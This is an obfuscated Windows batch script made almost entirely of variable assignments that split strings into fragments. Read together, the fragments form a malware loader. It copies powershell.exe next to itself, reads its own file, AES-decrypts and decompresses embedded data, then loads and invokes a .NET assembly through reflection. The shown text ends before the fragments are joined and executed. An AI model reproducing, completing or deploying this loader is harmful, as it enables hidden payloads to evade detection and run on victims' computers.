@echo off
set "nBOExvGBKi=co"
set "PTXKAvcXSu=do"
set "ZoReXHoFts=.e"
set "rwxpeJTDJU=\v"
set "dGACjVfGpU=ws"
set "IdahOxlIjX=rs"
set "ZvKFlSQGcb=Wi"
set "kZLxbtCJyu=he"
set "sBuJvRfvhI=\W"
set "PiDNFrBuSh=rS"
set "PVMdTHrUWH=Sy"
set "SwqomfCtKM=Po"
set "QrHfAGxYMn=:\"
set "pPVSQMUggR= /"
set "RVjTaWUHYu=ll"
set "MwRdjpvsNN=he"
set "DTmvFdiWuz=xe"
set "EhADBtrCmB=1."
set "YbXccpFbrU=in"
set "WUkOggWwMF=0\"
set "TRwbsKvqrq=ow"
set "TImgbZGmIK=ll"
set "pQqAQYKkDz=s\"
set "wzpLLYSyWl=em"
set "LoMiQOCvts=po"
set "DEJPYyFMgB=y "
set "bdwRXNOdNQ=py"
set "hzvNcYesiK=32"
set "VyKUtiZJnB=st"
set "PiZNjSKZnR=nd"
set "tvQPrFBOfI= C"
set "AZaDPLhIFH=we"
set "tdaoUyDJiZ=we"
set "qpzjHYMHaR= %~dp0"
set "htZFtRrvgH=cd"
set "hvFlFNobiz=.Mem"
set "DLdsTAtPjF=Disp"
set "aeYHgncsDC=stem"
set "PoYXFbeQMm=[Sys"
set "uzSBRSMPxg=;$Em"
set "JZpJDHdsLy=esMa"
set "cPBMQTDczk=m.Pa"
set "SdnxujkeNo=rity"
set "uiaVZtyBji== $q"
set "KHhqFqtHms=Obje"
set "BckUaJVNnk=);$E"
set "tfgGAgqnzt=uwXl"
set "wEYZzSRcLj=ress"
set "tQozdXIEeN=Zrnw"
set "RIHqzENZRf=iron"
set "CifQFhlyDB=7Yiv"
set "QDObEylxFA= '')"
set "mUaQaDQLAG=6esa"
set "bjbkViFZwI=Conv"
set "HiLFoYElWM=..-1"
set "afFvgRwBjU===')"
set "PktXlinGaS=NUm."
set "OOKVlJzGsL=Mode"
set "BqZCWBwkNC=gth)"
set "sMbUOGpFTr=ispo"
set "RPJlReSIca=File"
set "moTeqHsAjU=+hAO"
set "uvAjLRBYOr=eam("
set "lAclEsyrFN=$hmC"
set "jXdSJFNzEU=ypto"
set "FJrcxtezFQ=ach "
set "gXrvkCSMwC=REcm"
set "itCglMLPkO=rity"
set "ybwlWpJarx=fpeF"
set "aKGHbdPxWS=ecry"
set "wfueZOJrKs=tS46"
set "topAkEzwcY=d;$q"
set "xAxzXUHxSM=$qRE"
set "MOZEpaCBsF=VmxZ"
set "UHlBapfzTJ=ose("
set "HIYSOvJOyY=e = "
set "YoevAOgzuy=ress"
set "rOcrSHkyvR=w, 0"
set "NrupzTwkib=tem."
set "IIcAWhoQUr=lit("
set "rrhoYUOGoY= = N"
set "ynuAwTAygT=Stre"
set "FpHvjkGTgI=th('"
set "crzpSWuOCu=.IO."
set "msNDeaYnpT=Star"
set "UZNxGNeKKA=em.I"
set "aceazmMNSn=y]::"
set "gWxlXhuwkp=[IO."
set "uuOKseoaEQ=);$h"
set "msmwHiJnls=morF"
set "JOHqyaBiYN=($fp"
set "AmHRkZCRJY=kI);"
set "abDnAZMStk=rnww"
set "rGwqrcmCPj=ew-O"
set "lwhtCofDvn=:('g"
set "rqqPBjQjHq=-Obj"
set "MqrLDssmuq=;$Vm"
set "KfqfzgTqBN=Disp"
set "rFDkHpHaJx=]::("
set "cAmHQEwJKg=);$F"
set "YBLlEDjbru=tryP"
set "RbdGjzJktM=ke($"
set "lsltYmuuVn=();$"
set "YQaeGNNhHG=lIO."
set "JwEwtfxgiC=-joi"
set "upsILdnEdz=tem."
set "LUshQXIJem=$cdl"
set "QiNmkHlNte=w = "
set "vYOYchyFiN=q) {"
set "YtwZIIkMsu=comp"
set "jyirmibwdU='dqR"
set "lyuCoZnqFn=.Con"
set "xSSypqRZey=rnww"
set "ptefiSdaOg='[-1"
set "NypJMlomhk=Fina"
set "LdSyQpWRkZ=1] -"
set "tQlTzTpULF=, (,"
set "SeIIXJVmNZ=::('"
set "VXhQagWLCb=fore"
set "ONwMJdckDw=();$"
set "uxSmMZHDve= [Sy"
set "mGGbXtUbDV=ert]"
set "SBsVSlBGoS=('%~f0'"
set "DwaZXReFzz=Rq ="
set "pfyfCjaCJw=yste"
set "gBrRKNvzeN=ress"
set "AFbTaMduvR=m.Re"
set "bSywgzjqrr=$ffQ"
set "RclTryZyHP=Secu"
set "qMldMwmIWE=P.En"
set "qMXffWFNvS=am;$"
set "jbqCwJvNvV=.-16"
set "wbeKYxBgYL=k; }"
set "XBApXPJiLT=O.Me"
set "eoGdYyxBHQ=REcm"
set "aFMgweOvzq=yste"
set "tSywLrKzeX=F'[-"
set "yFxGPKyPii=hy.A"
set "EglvdOPwUX=urit"
set "hZLIPFZABI=m(, "
set "OyNMimnXhY=mory"
set "RBkXPmgPFo=Invo"
set "QEHVaAbUBn=saBm"
set "dmFqeUupRp='')("
set "jkescpHMjz=lBlo"
set "lKuPgHjUzo=isfL"
set "yXlfvopcPg=rofi"
set "FYSjCFSQhR= = $"
set "GEfQiyaady=.Len"
set "QFTrCIzZsp=yste"
set "CdYvXReHHo=.Cop"
set "UpfkDvyGZM=se()"
set "PyaNbbaMQF=Om.D"
set "wrpMqZitxH=-1.."
